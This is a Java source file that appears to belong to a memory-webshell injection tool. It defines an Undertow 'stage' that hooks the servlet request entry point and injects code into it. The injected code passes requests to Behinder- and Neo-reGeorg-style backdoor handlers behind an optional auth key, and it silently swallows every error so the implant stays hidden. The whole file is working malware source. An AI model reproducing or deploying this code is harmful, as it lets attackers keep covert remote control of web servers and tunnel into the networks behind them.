package indi.augusttheodor.stage;

import indi.augusttheodor.Options;

import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

public class UndertowStage implements Stage {

    @Override
    public String getName() {
        return "undertow";
    }

    @Override
    public Map<String, String[]> getHookPoints() {
        Map<String, String[]> re = new HashMap<>();
        // Undertow的Servlet请求入口，handleRequest最终也会调到handleFirstRequest
        re.put("io.undertow.servlet.handlers.ServletInitialHandler", new String[]{"handleFirstRequest"});
        return re;
    }

    @Override
    public void configure(Options options) {
        if (options.hasOption("a")) {
            String[] authKey = options.getOptionValue("a").split(":");
            ServletCompat.AUTH_KEY = authKey[0];
            ServletCompat.AUTH_VALUE = authKey[1];
        }
    }

    @Override
    public Set<String> getMarkers() {
        return new HashSet<>(Arrays.asList("io.undertow.servlet.handlers.ServletInitialHandler"));
    }

    @Override
    public String getInjectedSource(String className, String methodName, Options options) {
        // handleFirstRequest(HttpServerExchange exchange, ServletRequestContext servletRequestContext)
        // 从ServletRequestContext里拿ServletRequest/ServletResponse
        return "{" +
                "try{" +
                "java.util.Map _ag=indi.augusttheodor.stage.ServletCompat.handle($2.getServletRequest(),$2.getServletResponse());" +
                "if(_ag!=null){" +
                "java.util.Map _rd=indi.augusttheodor.stage.ServletCompat.getRdd(_ag);" +
                "try{org.apache.catalina.core.RebeyondServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "try{org.apache.catalina.core.ExtendServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "try{org.apache.catalina.core.NeoServices.doServices(_rd,_ag);}catch(Throwable _e){}" +
                "}" +
                "}catch(Throwable _t){}" +
                "}";
    }
}
